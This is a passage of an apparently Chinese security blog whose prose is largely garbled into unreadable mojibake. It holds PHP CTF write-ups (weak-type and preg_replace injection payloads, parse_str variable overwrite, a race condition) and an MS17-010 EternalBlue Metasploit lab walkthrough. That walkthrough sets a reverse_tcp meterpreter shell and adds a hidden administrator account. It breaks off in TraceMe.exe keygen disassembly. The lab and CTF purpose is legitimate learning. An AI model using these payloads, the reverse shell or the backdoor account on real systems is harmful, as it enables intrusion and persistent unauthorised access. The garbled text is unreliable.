class="hljs-string">&quot;POST&quot;</span> == <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>])&#123;    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];    <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= preg_match(<span class="hljs-string">&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;</span>, <span class="hljs-variable">$password</span>))    &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong Format&#x27;</span>;        <span class="hljs-keyword">exit</span>;    &#125;    <span class="hljs-keyword">while</span> (<span class="hljs-literal">TRUE</span>)    &#123;        <span class="hljs-variable">$reg</span> = <span class="hljs-string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;        <span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$arr</span>))            <span class="hljs-keyword">break</span>;        <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;        <span class="hljs-variable">$ps</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;punct&#x27;</span>, <span class="hljs-string">&#x27;digit&#x27;</span>, <span class="hljs-string">&#x27;upper&#x27;</span>, <span class="hljs-string">&#x27;lower&#x27;</span>);        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$ps</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$pt</span>)        &#123;            <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/[[:<span class="hljs-subst">$pt</span>:]]+/&quot;</span>, <span class="hljs-variable">$password</span>))            <span class="hljs-variable">$c</span> += <span class="hljs-number">1</span>;        &#125;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;42&quot;</span> == <span class="hljs-variable">$password</span>) <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;        <span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong password&#x27;</span>;        <span class="hljs-keyword">exit</span>;    &#125;&#125;highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>å­—ç¬¦ç±»çš„å«ä¹‰æ˜¯</p><pre><code class="hljs gauss"><span class="hljs-keyword">graph</span> ç©ºæ ¼ä»¥å¤–çš„å¯æ‰“å°å­—ç¬¦punct  æ‰“å°å­—ç¬¦ï¼Œä¸åŒ…æ‹¬å­—æ¯æ•°å­—</code></pre><p>ä¸»è¦å‡½æ•°é‡Œï¼Œç¬¬ä¸€ä¸ªæ­£åˆ™è¡¨ç¤ºåŒ¹é…åˆ°å¯æ‰“å°å­—ç¬¦12ä¸ªä»¥ä¸Š;ç¬¬äºŒä¸ªæ­£åˆ™è¡¨ç¤ºæŠŠè¿ç»­çš„ç¬¦å·ã€æ•°å­—ã€å¤§å†™ã€å°å†™ï¼Œä½œä¸ºä¸€æ®µï¼Œè‡³å°‘åˆ†å…­æ®µ;ç¬¬ä¸‰ä¸ªæ­£åˆ™è¡¨ç¤ºè¾“å…¥çš„å­—ç¬¦ä¸²è‡³å°‘å«æœ‰ç¬¦å·ã€æ•°å­—ã€å¤§å†™ã€å°å†™ä¸­çš„ä¸‰ç§ç±»å‹ã€‚</p><p>æœ€åä¸æ•°å­—è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒã€‚<br>payload</p><pre><code class="hljs apache"><span class="hljs-attribute">42</span>.<span class="hljs-number">00</span>e+<span class="hljs-number">00000</span></code></pre><p>ç¬¬ä¸€ç§æ–¹æ³•</p><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//</span><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1/index.php?option=a</span></code></pre><p>ç¬¬ä¸€ä¸ªpayloadå†™å…¥å†…å®¹ååªæœ‰ä¸€ä¸ªå•å¼•å·è¢«è½¬ä¹‰çš„é—®é¢˜ã€‚è€Œç¬¬äºŒéƒ¨åˆ†å†ä¼ å…¥ä¸€ä¸ªaæ—¶å°±ä¼šå› ä¸º<code>.*</code>åŒ¹é…æ— æ•°æ¬¡è€ŒæŠŠ<code>\</code>æ¢æ‰</p><p>è¿˜æœ‰ä¸¤ç§preg_replaceçš„æ–¹æ³•ã€è¿™é‡Œæä¸‹ç¬¬äºŒç§ï¼Œä¹Ÿå°±æ˜¯è¿˜é€‚ç”¨äºå•è¡Œ(éè´ªå©ª)æ¨¡å¼çš„payloadã€‚ä¹‹å‰å®‰æ’çš„å¥—å¨ƒweb2é‡Œå‡ºç°è¿‡ã€‚</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/test/</span>ph.php?option=;phpinfo();http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/test/</span>ph.php?option=<span class="hljs-variable">$0</span></code></pre><p>å…¶æœ€åçš„æ•ˆæœæ˜¯ä¸‹é¢è¿™æ ·çš„</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$option</span>=<span class="hljs-string">&#x27;$option=&#x27;</span>;phpinfo();<span class="hljs-string">&#x27;;&#x27;</span>;</code></pre><h2 id="6-parse-strå‡½æ•°ç¼ºé™·"><a href="#6-parse-strå‡½æ•°ç¼ºé™·" class="headerlink" title="6.parse_strå‡½æ•°ç¼ºé™·"></a>6.parse_strå‡½æ•°ç¼ºé™·</h2><p><strong>æ¼æ´ä»£ç </strong></p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getUser</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>) </span>&#123;  <span class="hljs-keyword">global</span> <span class="hljs-variable">$config</span>, <span class="hljs-variable">$db</span>;  <span class="hljs-keyword">if</span> (!is_resource(<span class="hljs-variable">$db</span>)) &#123;    <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> MySQLi(      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbhost&#x27;</span>],      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbuser&#x27;</span>],      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbpass&#x27;</span>],      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbname&#x27;</span>]    );  &#125;  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT username FROM users WHERE id = ?&quot;</span>;  <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$db</span>-&gt;prepare(<span class="hljs-variable">$sql</span>);  <span class="hljs-variable">$stmt</span>-&gt;bind_param(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-variable">$id</span>);  <span class="hljs-variable">$stmt</span>-&gt;bind_result(<span class="hljs-variable">$name</span>);  <span class="hljs-variable">$stmt</span>-&gt;execute();  <span class="hljs-variable">$stmt</span>-&gt;fetch();  <span class="hljs-keyword">return</span> <span class="hljs-variable">$name</span>;&#125;<span class="hljs-variable">$var</span> = parse_url(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>]);parse_str(<span class="hljs-variable">$var</span>[<span class="hljs-string">&#x27;query&#x27;</span>]);<span class="hljs-variable">$currentUser</span> = getUser(<span class="hljs-variable">$id</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$currentUser</span>).<span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span>;</code></pre><p><strong>æ¼æ´è§£æ</strong></p><p><strong>parse_str</strong></p><p>å…ˆæ¥çœ‹çœ‹å®šä¹‰ï¼š</p><blockquote><p>parse_str<br><strong>åŠŸèƒ½</strong> ï¼šparse_strçš„ä½œç”¨å°±æ˜¯è§£æå­—ç¬¦ä¸²å¹¶ä¸”æ³¨å†Œæˆå˜é‡ï¼Œå®ƒåœ¨æ³¨å†Œå˜é‡ä¹‹å‰ä¸ä¼šéªŒè¯å½“å‰å˜é‡æ˜¯å¦å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šç›´æ¥è¦†ç›–æ‰å½“å‰ä½œç”¨åŸŸä¸­åŸæœ‰çš„å˜é‡ã€‚</p><p>å®šä¹‰ ï¼švoid parse_str( string $encoded_string [, array &amp;$result ] )</p><p>å¦‚æœ encoded_string æ˜¯ URL ä¼ å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquery stringï¼‰ï¼Œåˆ™å°†å®ƒè§£æä¸ºå˜é‡å¹¶è®¾ç½®åˆ°å½“å‰ä½œç”¨åŸŸï¼ˆå¦‚æœæä¾›äº† result åˆ™ä¼šè®¾ç½®åˆ°è¯¥æ•°ç»„é‡Œ ï¼‰</p></blockquote><p>çœ‹äº†å®šä¹‰æˆ‘ä»¬ä¹Ÿèƒ½å¾ˆå¿«æ„Ÿå—åˆ°å®ƒçš„æ¼æ´ç‚¹å°±æ˜¯å˜é‡è¦†ç›–äº†ã€‚</p><p><strong>PHP $_SERVER[â€˜HTTP_REFERERâ€™]</strong></p><p>PHP <code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>ï¼Œå®ƒæ˜¯è·å–å½“å‰é¡µé¢çš„urlã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>$_SERVER[â€˜HTTP_REFERERâ€™]</code>å®Œå…¨æ¥æºäºæµè§ˆå™¨ã€‚å¹¶ä¸æ˜¯æ‰€æœ‰çš„ç”¨æˆ·ä»£ç†ï¼ˆæµè§ˆå™¨ï¼‰éƒ½ä¼šè®¾ç½®è¿™ä¸ªå˜é‡ï¼Œè€Œä¸”æœ‰çš„è¿˜å¯ä»¥æ‰‹å·¥ä¿®æ”¹ HTTP_REFERERã€‚å› æ­¤ï¼Œ$_SERVER[â€˜HTTP_REFERERâ€™] æ˜¯å¯ä»¥ä¼ªé€ çš„ã€‚<br><strong><code>$_SERVER[â€˜HTTP_REFERERâ€™]</code>å¯¹ POST è¡¨å•è®¿é—®ä¹Ÿæ˜¯æœ‰æ•ˆçš„</strong><br>æˆ‘ä»¬æƒ³åŠæ³•æäº¤ç±»ä¼¼ config[dbhost]=127.0.0.1 è¿™æ ·ç±»å‹çš„æ•°æ®ï¼Œè¿™æ ·å› æ­¤æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿æ¥çš„æ•°æ®åº“ï¼Œå¯¼è‡´ç½‘ç«™å‡ºç°é”™è¯¯æ˜¾ç¤ºã€‚</p><p><strong>CTFé¢˜ç›®</strong></p><p>index.php</p><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span> = â€œhongriâ€;<span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];@parse_str(<span class="hljs-variable">$id</span>);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; md5(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;upload.php&quot;&gt;flag is here&lt;/a&gt;&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>upload.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>header(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<span class="hljs-variable">$referer</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$referer</span>)!== <span class="hljs-literal">false</span>) &#123;    <span class="hljs-variable">$savepath</span> = <span class="hljs-string">&quot;uploads/&quot;</span> . sha1(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&quot;/&quot;</span>;    <span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$savepath</span>)) &#123;        <span class="hljs-variable">$oldmask</span> = umask(<span class="hljs-number">0</span>);        mkdir(<span class="hljs-variable">$savepath</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);        umask(<span class="hljs-variable">$oldmask</span>);    &#125;    <span class="hljs-keyword">if</span> ((@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; (@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;        <span class="hljs-comment">//$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;);</span>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#x27;</span>;        file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="hljs-variable">$savepath</span> . htmlspecialchars(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) . <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;        usleep(<span class="hljs-number">100000</span>);        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Too slow!&quot;</span>;        file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);    &#125;   <span class="hljs-keyword">print</span> &lt;&lt;&lt;EOT&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;&lt;div class=&quot;form-group&quot;&gt;&lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;exampleInputEmail1&quot;</span>&gt;Filename&lt;/label&gt;&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;filename&quot; id=&quot;exampleInputEmail1&quot; placeholder=&quot;Filename&quot;&gt;&lt;/div&gt;&lt;div class=&quot;form-group&quot;&gt;&lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;exampleInputPassword1&quot;</span>&gt;Content&lt;/label&gt;&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;content&quot; id=&quot;exampleInputPassword1&quot; placeholder=&quot;Contont&quot;&gt;&lt;/div&gt;&lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Submit&lt;/button&gt;&lt;/form&gt;EOT;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you can not see this page&#x27;</span>;&#125;</code></pre><p><strong>ç¬¬ä¸€å…³</strong></p><p>åœ¨index.phpå†…æœ‰å¦‚ä¸‹;</p><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];@parse_str(<span class="hljs-variable">$id</span>);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; md5(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;upload.php&quot;&gt;flag is here&lt;/a&gt;&#x27;</span>;</code></pre><p>å¯æƒ³è€ŒçŸ¥æˆ‘ä»¬éœ€è¦ç”¨å˜é‡è¦†ç›–ï¼Œpayloadä¸ºï¼š</p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=a[0]=s878926199a</code></pre><p>å°±ä¼šå‡ºæ¥ä¸€ä¸ªé“¾æ¥ï¼Œç‚¹å‡»å°±åˆ°äº†uploadé¡µé¢ã€‚å¦‚æœæˆ‘ä»¬ç›´æ¥è®¿é—®uploadä¼šæŠ¥é”™ï¼Œå› ä¸ºæœ‰å¦‚ä¸‹ä»£ç ï¼š</p><pre><code class="hljs php"><span class="hljs-variable">$referer</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$referer</span>)!== <span class="hljs-literal">false</span>)</code></pre><p>å½“æˆ‘ä»¬æ˜¯é€šè¿‡aæ ‡ç­¾é“¾æ¥è¿‡å»çš„ä¼šè‡ªåŠ¨å¸¦ä¸Šreferå­—æ®µã€‚</p><p><strong>ç¬¬äºŒå…³</strong></p><p>uplaodä¸»è¦ä»£ç ï¼š</p><pre><code class="hljs awk"><span class="hljs-keyword">if</span> ((@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; (@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;        <span class="hljs-regexp">//</span><span class="hljs-variable">$fp</span> = fopen(<span class="hljs-string">&quot;$savepath&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-string">&#x27;w&#x27;</span>);        <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#x27;</span>;        file_put_contents(<span class="hljs-string">&quot;$savepath&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="hljs-variable">$savepath</span> . htmlspecialchars(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) . <span class="hljs-string">&quot;&quot;</span>;        echo <span class="hljs-variable">$msg</span>;        usleep(<span class="hljs-number">100000</span>);<span class="hljs-regexp">//</span>å»¶è¿Ÿ        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Too slow!&quot;</span>;        file_put_contents(<span class="hljs-string">&quot;$savepath&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);    &#125;</code></pre><p>å¯ä»¥å‘ç°ä¼šæˆ‘ä»¬ä¼ å…¥çš„<code>filename</code>ä¼šå›ºå®šçš„å­˜å‚¨åœ¨ä¸€ä¸ªå›ºå®šçš„ä½ç½®ï¼Œè€Œè¿™ä¸ªä½ç½®ä¼šåœ¨è¾“å‡ºä¸­å¾—åˆ°ã€‚<br>è€Œæ–‡ä»¶çš„å†…å®¹å…ˆæ˜¯flagç„¶åå»¶è¿Ÿä¸€ä¸‹é©¬ä¸Šæ›¿æ¢ä¸ºäº† Too slow! ã€‚å…¶å®è¾“å…¥çš„contentå¹¶æ²¡ä»»ä½•ä½œç”¨ã€‚<br>æ€è·¯ï¼šæˆ‘ä»¬ä¸€ç›´ä¸Šä¼ åŒä¸€ä¸ªæ–‡ä»¶åï¼Œç„¶åä½¿ç”¨pythonæˆ–è€…pbä¸æ–­çš„è®¿é—®è¿™ä¸ªæ–‡ä»¶ã€‚å¦‚æœå¤Ÿå¿«å°±ä¸ä¼šæŠŠæ–‡æœ¬å†…å®¹æ›¿æ¢ä¸º Too slow! è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è®¿é—®åˆ°flag</p><h1 id="MS17-010æ¼æ´åˆ©ç”¨æ¼”ç¤º"><a href="#MS17-010æ¼æ´åˆ©ç”¨æ¼”ç¤º" class="headerlink" title="MS17-010æ¼æ´åˆ©ç”¨æ¼”ç¤º"></a>MS17-010æ¼æ´åˆ©ç”¨æ¼”ç¤º</h1><h2 id="1-å‡†å¤‡å·¥ä½œ"><a href="#1-å‡†å¤‡å·¥ä½œ" class="headerlink" title="1.å‡†å¤‡å·¥ä½œ"></a>1.å‡†å¤‡å·¥ä½œ</h2><p>å¼€å¯ä¸¤å°è™šæ‹Ÿæœºï¼Œä¸€å°kaliä½œä¸ºæ”»å‡»æ–¹ï¼Œä¸€å°win7ä½œä¸ºè¢«æ”»å‡»æ–¹</p><p>å°†ä¸¤å°è™šæ‹Ÿæœºæ¡¥æ¥åˆ°åŒä¸€ç½‘å¡ï¼Œå¹¶ä¿è¯èƒ½å¤Ÿé€šä¿¡</p><p>Kali IP 192.168.164.143</p><p>win7 IP 192.168.164.135 </p><p> ä½¿ç”¨pingæµ‹è¯•å³å¯</p><p>ä½¿ç”¨msfå‰éœ€è¦å¼€å¯postgresqlæœåŠ¡ </p><p>å¼€å¯æœåŠ¡ï¼š</p><pre><code class="hljs crmsh">service postgresql <span class="hljs-literal">start</span></code></pre><p>æŸ¥çœ‹æœåŠ¡çŠ¶æ€ï¼š</p><pre><code class="hljs ebnf"><span class="hljs-attribute">service postgresql status</span></code></pre><p>å¼€åˆ°ç»¿è‰²å­—ä½“çš„activeå³ä¸ºå¼€å¯äº†</p><p>åˆå§‹åŒ–æ•°æ®åº“ï¼š</p><pre><code class="hljs csharp">msfdb <span class="hljs-keyword">init</span></code></pre><p><img src="https://i.loli.net/2020/11/30/g72amLUwHvp3jSe.png" alt="3.png" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210410130055679.png" alt="image-20210410130055679" style="zoom:50%;"> </p><h2 id="2-æ”»å‡»è¿‡ç¨‹"><a href="#2-æ”»å‡»è¿‡ç¨‹" class="headerlink" title="2. æ”»å‡»è¿‡ç¨‹"></a>2. æ”»å‡»è¿‡ç¨‹</h2><p><strong>(1).é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£</strong></p><p>ä½¿ç”¨nmap+ip æ‰«æ</p><img src="https://i.loli.net/2020/11/30/OPuivdSaVlTIMsm.png" alt="4.png" style="zoom:50%;"> <p><strong>(2) .ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡»</strong></p><p>è¾“å…¥<code>msfconsole</code>ã€€å¯åŠ¨msf</p><p>è¾“å…¥searchã€€MS17-010</p><p>æ‰¾åˆ°exploit windows/smb/ms17_010_eternalblue,</p><p>è¿è¡Œ</p><pre><code class="hljs apache"><span class="hljs-attribute">use</span> exploitwindows/smb/ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>_eternalblue</code></pre><p>è¾“å…¥ show options  æŸ¥çœ‹éœ€è¦é…ç½®å“ªäº›ä¿¡æ¯</p><p>RHOSTS ä¸ºç›®æ ‡ä¸»æœºIP(10.1.1.2)</p><p>RPORT ä¸ºç›®æ ‡ç«¯å£å·(445)</p><p>LHOST ä¸ºç›‘å¬ä¸»æœºIP(10.1.1.1)</p><img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" alt="5.png" style="zoom:50%;"> <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210410130809305.png" alt="image-20210410130809305"></p><p><strong>(3). é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥</strong></p><p>è¾“å…¥å‘½ä»¤</p><pre><code class="hljs awk">set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp</code></pre><p><strong>(4).å¼€å§‹è¿è¡Œ</strong></p><p>è¾“å…¥ exploit/run </p><p>æˆåŠŸè·å–shell</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210410163228489.png" alt="image-20210410163228489" style="zoom:50%;"><p>æŸ¥çœ‹ipåœ°å€éªŒè¯æ˜¯å¦ä¸ºç›®æ ‡ä¸»æœºã€‚</p><p><strong>(5)è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·</strong></p><p>åˆ›å»ºä¸€ä¸ªç”¨æˆ·</p><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">test</span> abc123.com /add</code></pre><p>Username:test </p><p>password:abc123.com</p><p>å°†è¯¥ç”¨æˆ·åŠ å…¥ç®¡ç†å‘˜ç»„ï¼Œä½¿å…¶æ‹¥æœ‰ç®¡ç†å‘˜æƒé™</p><pre><code class="hljs stata"><span class="hljs-keyword">net</span> localgroup administrtors <span class="hljs-keyword">test</span> /add</code></pre><p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" alt="10.png"></p><p>ç›®æ ‡ä¸»æœºä¸Šç”¨æˆ·åˆ›å»ºæˆåŠŸ</p><img src="https://i.loli.net/2020/11/30/LPm3HzVNfW5k947.png" alt="11.png" style="zoom: 50%;"><p>  <strong>å®éªŒç»“æŸ</strong></p><h1 id="TraceMe-exeæ³¨å†Œæœº"><a href="#TraceMe-exeæ³¨å†Œæœº" class="headerlink" title="TraceMe.exeæ³¨å†Œæœº"></a>TraceMe.exeæ³¨å†Œæœº</h1><p>æ‰“å¼€ç¨‹åºï¼Œéšä¾¿è¯•ä¸€è¯•</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514154316260.png" alt="image-20210514154316260"></p><p>é€šè¿‡ODæ‰“å¼€è¯¥ç¨‹åºï¼Œå®ƒä¼šè‡ªåŠ¨å®šä½åˆ°æ¨¡å—å…¥å£ç‚¹0x004013A0ä½ç½®ï¼Œä¹Ÿå°±æ˜¯éªŒè¯å‡½æ•°çš„å†…å®¹</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514155349139.png" alt="image-20210514155349139" style="zoom:67%;"><p>æ•°æ®è¡¨ä¸­405030çš„æ•°æ®ï¼Œç¨‹åºä¸­éœ€è¦ç”¨åˆ°</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514155944624.png" alt="image-20210514155944624"></p><p>æ±‡ç¼–ä»£ç çš„å¦‚ä¸‹</p><pre><code class="hljs vb"><span class="hljs-number">00401340</span>  /$  <span class="hljs-number">55</span>            push ebp<span class="hljs-number">00401341</span>  |.  <span class="hljs-number">8</span>B6C24 <span class="hljs-number">0</span>C     mov ebp,dword ptr ss:[esp+<span class="hljs-number">0</span>xC]          ;ebp = ç”¨æˆ·å<span class="hljs-number">00401345</span>  |.  <span class="hljs-number">56</span>            push esi                                 ;  TraceMe.<span class="hljs-number">0040504</span>F<span class="hljs-number">00401346</span>  |.  <span class="hljs-number">57</span>            push edi<span class="hljs-number">00401347</span>  |.  <span class="hljs-number">8</span>B7C24 <span class="hljs-number">18</span>     mov edi,dword ptr ss:[esp+<span class="hljs-number">0</span>x18]         ;edi = ç”¨æˆ·åçš„é•¿åº¦<span class="hljs-number">0040134</span>B  |.  B9 <span class="hljs-number">03000000</span>   mov ecx,<span class="hljs-number">0</span>x3 ;ecx = ä»ç”¨æˆ·åçš„ç¬¬å››ä¸ªå­—ç¬¦å¼€å§‹è®¡ç®—<span class="hljs-number">00401350</span>  |.  <span class="hljs-number">33</span>F6          <span class="hljs-built_in">xor</span> esi,esi     ;esi = <span class="hljs-number">0</span> = è®¡ç®—å‡ºçš„æ³¨å†Œç                              ;  TraceMe.<span class="hljs-number">0040504</span>F<span class="hljs-number">00401352</span>  |.  <span class="hljs-number">33</span>C0          <span class="hljs-built_in">xor</span> eax,eax     ;eax = <span class="hljs-number">0</span>,ç”¨äºè®¡æ•°ï¼Œè¯»å–æ•°æ®è¡¨çš„ç¬¬eaxä¸ªå­—èŠ‚<span class="hljs-number">00401354</span>  |.  <span class="hljs-number">3</span>BF9          cmp edi,ecx     ;<span class="hljs-keyword">if</span>(edi &gt; ecx)00401356  |.  7E 21         jle short   ;&#123; TraceMe.00401379<span class="hljs-number">00401358</span>  |.  <span class="hljs-number">53</span>            push ebx<span class="hljs-number">00401359</span>  |&gt;  <span class="hljs-number">83</span>F8 <span class="hljs-number">07</span>       /cmp eax,<span class="hljs-number">0</span>x7    ; <span class="hljs-keyword">if</span>(eax &gt; <span class="hljs-number">7</span>)<span class="hljs-number">0040135</span>C  |.  <span class="hljs-number">7</span>E <span class="hljs-number">02</span>         |jle <span class="hljs-type">short</span> TraceMe.<span class="hljs-number">00401360</span>0040135E  |.  33C0          |xor eax,eax    ;&#123;eax = 0;&#125;<span class="hljs-number">00401360</span>  |&gt;  <span class="hljs-number">33</span>D2          |<span class="hljs-built_in">xor</span> edx,edx    ;edx = <span class="hljs-number">0</span>;<span class="hljs-number">00401362</span>  |.  <span class="hljs-number">33</span>DB          |<span class="hljs-built_in">xor</span> ebx,ebx    ;ebx = <span class="hljs-number">0</span><span class="hljs-number">00401364</span>  |.  <span class="hljs-number">8</span>A1429        |mov dl,<span class="hljs-type">byte</span> ptr 